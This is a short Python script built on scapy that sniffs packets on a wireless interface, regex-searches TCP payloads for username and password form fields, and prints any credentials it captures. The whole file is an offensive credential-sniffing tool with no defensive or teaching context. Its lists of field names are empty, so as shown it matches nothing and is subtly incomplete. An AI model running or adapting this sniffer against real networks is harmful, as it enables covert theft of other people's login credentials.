from scapy.all import *
from urllib import parse
import re

iface = 'wlp6s0'


def get_login_pass(body):
    User = None
    pwd = None
    UserFields = []
    pwdFields = []

    for login in UserFields:
        login_re = re.search('(%s=[^&]+)' % login, body, re.IGNORECASE)
        if login_re:
            User = login_re.group()
    for password in pwdFields:
        pwd_re = re.search('(%s=[^&]+)' % password, body, re.IGNORECASE)
        if pwd_re:
            pwd = pwd_re.group()

    if User and pwd:
        return (User,pwd)


def pkt_parser(packet):
    if packet.haslayer(TCP) and packet.haslayer(IP) and packet.haslayer(Raw):
        body = str(packet[TCP].payload)
        user_pass = get_login_pass(body)
        if user_pass != None:
            print(packet[TCP].payload)
            print(parse.unquote(user_pass[0]))
            print(parse.unquote(user_pass[1]))
    else:
        pass


try:
    sniff(iface=iface, prn=pkt_parser, store=0 )
except KeyboardInterrupt:
    print('Exiting')
    exit(0)